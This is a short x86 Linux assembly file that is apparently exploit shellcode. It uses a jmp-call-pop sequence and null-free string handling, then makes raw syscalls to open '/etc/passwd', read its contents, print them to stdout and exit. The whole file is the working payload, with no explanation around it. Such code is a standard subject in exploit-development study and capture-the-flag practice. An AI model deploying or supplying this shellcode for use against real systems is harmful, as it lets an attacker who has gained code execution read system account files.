        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop ebx
        xor ecx, ecx
        mov cl, [ebx]
        inc ebx
        mov [ebx+ecx], ch
main:
        xor ecx, ecx
        lea eax, [ecx+5]
        int 0x80                # open
        xchg ebx, eax
        xchg ecx, eax
        lea edx, [eax+1]
        shl edx, 12
        push 3
        pop eax
        int 0x80                # read
        xchg edx, eax
        push 1
        pop ebx
        push 4
        pop eax
        int 0x80                # write
        xor ebx, ebx
        lea eax, [ebx+1]
        int 0x80                # exit
caller:
        call callee
arg:
        .byte 11
        .ascii "/etc/passwd"
